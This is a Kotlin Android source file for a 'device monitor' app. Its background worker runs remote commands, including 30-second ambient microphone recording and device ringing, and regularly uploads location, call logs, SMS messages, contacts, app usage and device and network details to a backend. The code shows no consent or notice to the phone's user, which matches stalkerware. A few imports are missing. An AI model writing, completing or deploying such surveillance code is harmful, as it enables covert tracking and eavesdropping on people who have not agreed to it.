package com.devicemonitor.service

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.Looper
import android.os.Vibrator
import android.os.VibratorManager
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.devicemonitor.data.models.AmbientRecording
import com.devicemonitor.data.models.AppUsage
import com.devicemonitor.data.models.CallLogEntry
import com.devicemonitor.data.models.ContactEntry
import com.devicemonitor.data.models.LocationEntry
import com.devicemonitor.data.models.RemoteCommand
import com.devicemonitor.data.models.SmsEntry
import com.devicemonitor.data.repository.DeviceRepository
import com.devicemonitor.utils.Constants
import com.devicemonitor.utils.RecordingHelper
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SyncWorker(
    private val context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    private val repository = DeviceRepository()
    private val deviceCollector = DeviceCollector(context)
    private val fusedLocationClient: FusedLocationProviderClient =
        LocationServices.getFusedLocationProviderClient(context)

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            // Process Pending Remote Commands
            val pendingCommands = repository.getPendingCommands(Constants.DEVICE_ID)
            pendingCommands.forEach { command ->
                try {
                    when (command.command) {
                        "fetch_location" -> {
                            // Already fetching location, just mark as completed
                            command.status = "completed"
                            repository.updateCommandStatus(command)
                        }
                        "take_photo" -> {
                            // TODO: Implement take photo
                            command.status = "completed"
                            repository.updateCommandStatus(command)
                        }
                        "ring_device" -> {
                            // Vibrate device
                            val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                                val vibratorManager = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                                vibratorManager.defaultVibrator
                            } else {
                                context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                vibrator.vibrate(
                                    android.os.VibrationEffect.createWaveform(
                                        longArrayOf(0, 500, 200, 500),
                                        0
                                    )
                                )
                            } else {
                                vibrator.vibrate(longArrayOf(0, 500, 200, 500), 0)
                            }
                            command.status = "completed"
                            repository.updateCommandStatus(command)
                        }
                        "sync_data" -> {
                            // Already syncing, just mark as completed
                            command.status = "completed"
                            repository.updateCommandStatus(command)
                        }
                        "record_ambient" -> {
                            // Record ambient sound for 30 seconds
                            val recordingHelper = RecordingHelper(context)
                            val outputFile = recordingHelper.startAmbientRecording()
                            if (outputFile != null) {
                                kotlinx.coroutines.delay(30000) // Record for 30 seconds
                                recordingHelper.stopAmbientRecording()
                                // Insert ambient recording entry
                                val ambientEntry = AmbientRecording(
                                    device_id = Constants.DEVICE_ID,
                                    file_url = outputFile.absolutePath,
                                    duration_seconds = 30,
                                    recorded_at = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                                )
                                repository.insertAmbientRecording(ambientEntry)
                            }
                            command.status = "completed"
                            repository.updateCommandStatus(command)
                        }
                        "record_screen" -> {
                            // TODO: Implement record screen
                            command.status = "completed"
                            repository.updateCommandStatus(command)
                        }
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                    command.status = "failed"
                    repository.updateCommandStatus(command)
                }
            }

            // Sync Location
            val location = getLastKnownLocation()
            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
            val locationEntry = LocationEntry(
                device_id = Constants.DEVICE_ID,
                latitude = location?.latitude ?: 0.0,
                longitude = location?.longitude ?: 0.0,
                battery_level = deviceCollector.getBatteryLevel(),
                is_charging = deviceCollector.isCharging(),
                recorded_at = timestamp
            )
            repository.insertLocation(locationEntry)

            // Sync Network Info
            try {
                repository.insertNetworkInfo(deviceCollector.getNetworkInfo())
            } catch (e: Exception) {
                e.printStackTrace()
            }

            // Sync Device Info
            try {
                repository.insertDeviceInfo(deviceCollector.getDeviceInfo())
            } catch (e: Exception) {
                e.printStackTrace()
            }

            // Sync Call Logs
            val callLogs = deviceCollector.getRecentCallLogs()
            callLogs.forEach { log ->
                try {
                    repository.insertCallLog(log)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            // Sync SMS
            val smsList = deviceCollector.getRecentSms()
            smsList.forEach { sms ->
                try {
                    repository.insertSms(sms)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            // Sync App Usage
            val appUsageList = deviceCollector.getAppUsageStats()
            appUsageList.forEach { usage ->
                try {
                    repository.insertAppUsage(usage)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            // Sync Contacts
            val contacts = deviceCollector.getContacts()
            contacts.forEach { contact ->
                try {
                    repository.insertContact(contact)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            Result.retry()
        }
    }

    private suspend fun getLastKnownLocation(): Location? {
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return null
        }

        return try {
            // Try to get last known location first
            val lastLocation = fusedLocationClient.lastLocation.await()
            if (lastLocation != null) {
                lastLocation
            } else {
                // Request a fresh location if last known is null
                requestFreshLocation()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            null
        }
    }

    private suspend fun requestFreshLocation(): Location? {
        val locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            10000
        ).build()

        val deferredLocation = kotlinx.coroutines.CompletableDeferred<Location?>()
        val locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                deferredLocation.complete(locationResult.lastLocation)
                fusedLocationClient.removeLocationUpdates(this)
            }
        }

        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            locationCallback,
            Looper.getMainLooper()
        )

        // Wait for location or timeout after 15 seconds
        kotlinx.coroutines.withTimeoutOrNull(15000L) {
            deferredLocation.await()
        }
    }

    private suspend fun com.google.android.gms.tasks.Task<Location>.await(): Location? {
        return kotlinx.coroutines.suspendCancellableCoroutine { continuation ->
            addOnSuccessListener { location ->
                continuation.resume(location) { /* cleanup */ }
            }
            addOnFailureListener { e ->
                continuation.resumeWithException(e)
            }
            addOnCanceledListener {
                continuation.cancel()
            }
        }
    }
}
